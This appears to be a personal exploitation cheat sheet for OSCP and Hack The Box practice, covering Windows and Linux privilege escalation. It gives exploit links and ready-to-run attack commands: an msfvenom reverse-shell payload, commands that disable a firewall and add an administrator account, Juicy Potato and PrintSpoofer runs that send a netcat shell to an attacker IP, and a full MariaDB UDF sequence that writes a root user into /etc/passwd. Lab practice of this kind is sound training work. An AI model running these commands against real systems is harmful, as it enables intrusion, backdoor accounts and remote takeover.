# CTF search
https://ippsec.rocks/
https://0xdf.gitlab.io/
https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/


# EternalBlue
* windows 7/2008/8/2012 x64
    * https://github.com/helviojunior/MS17-010
    > msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=4444 --platform windows -a x86 -f exe -o windows_x86_shell_reverse_tcp.exe
    > python send_and_execute.py <ip> shellcode/windows_x86_shell_reverse_tcp.exe
* Windows 8.1 Enterprise 9600 x64
    * https://www.exploit-db.com/exploits/42315
    > service_exec(conn, r'cmd /c netsh firewall set opmode disable') # disbale firewall
    > service_exec(conn, r'cmd /c net user bill pass /add')
    > service_exec(conn, r'cmd /c net localgroup administrators bill /add') 

# MS08-067 (smb-vuln-ms08-067)
* https://www.exploit-db.com/exploits/40279

# MS11-046
* https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-046

# MS14-058
* https://www.exploit-db.com/exploits/37064

# Windows KE search
https://github.com/SecWiki/windows-kernel-exploits

# Juicy Potato
* x86, https://github.com/ivanitlearning/Juicy-Potato-x86
    > JuicyPotato.exe -l 4444 -p C:\Users\jill\Desktop\nc.exe -a "<ip> 5555 -e cmd.exe" -t * -c {6d18ad12-bde3-4393-b311-099c346e6df9}
* x64, https://github.com/ohpe/juicy-potato/releases/tag/v0.1
* SeImpersonatePrivilege, https://github.com/itm4n/PrintSpoofer
    > PrintSpoofer32.exe -i -c cmd
    > PrintSpoofer32.exe -c "nc.exe <ip> 1337 -e cmd"

# spoolsv
* https://github.com/calebstewart/CVE-2021-1675
    * https://www.exabeam.com/information-security/detecting-the-printnightmare-cve-2021-1675-34527-vulnerability-using-exabeam/
* Impacted versions:
    * Windows Server Version 2004
    * Windows Server Version 2008
    * Windows Server Version 2008R2
    * Windows Server Version 2012
    * Windows Server Version 2012R2
    * Windows Server 2016
    * Windows Server 2019
    * Windows Server 20H2
    * Windows 7
    * Windows 8.1
    * Windows 10


# Windows Server and exploits
* Microsoftr Windows Serverr 2008 Standard 6.0.6001 Service Pack 1 Build 6001 exploit
    * https://www.exploit-db.com/exploits/15589


# linux
* extract all vulnerable kernels
    > curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '

## Kernel exploits search
https://kakyouim.hatenablog.com/entry/2020/05/27/010807#MS16-016-high
https://github.com/lucyoa/kernel-exploits
https://github.com/offensive-security/exploitdb-bin-sploits
https://github.com/bwbwbwbw/linux-exploit-binaries
https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack

## linux kernel
* 2.6.32-21-generic-pae, https://www.exploit-db.com/exploits/14814
* 4.4.0-31-generic, https://www.exploit-db.com/exploits/45010

## Sudo version 1.8.27
* https://github.com/blasty/CVE-2021-3156

## CVE-2009-2692
* https://www.exploit-db.com/exploits/9545
* The following comment on other missed protocols, if one protocol doesn't work, try others
    * https://bugzilla.redhat.com/show_bug.cgi?id=516949#c24
    * e.g PF_PPPOX

## MariaDB
* MariaDB 10.2, https://github.com/Al1ex/CVE-2021-27928
* found https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c
> wget https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c
> gcc -g -c raptor_udf2.c
> gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
> mysql -u root -p
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/tmp/raptor_udf2.so'));

// Look for the value of plugin_dir and use the plugin_dir as the dump file location
mysql> show variables like '%plugin%';
mysql> select * from foo into dumpfile "/usr/lib/x86_64/mariadb18/plugin/raptor_udf2.so";

mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;
mysql> select do_system('echo \'hacker:$1$hacker$zVnrpoW2JQO5YUrLmAs.o1:0:0:root:/root:/bin/bash\' >> /etc/passwd');
* sometime this may say the file is too short, try to compile the so in a different folder
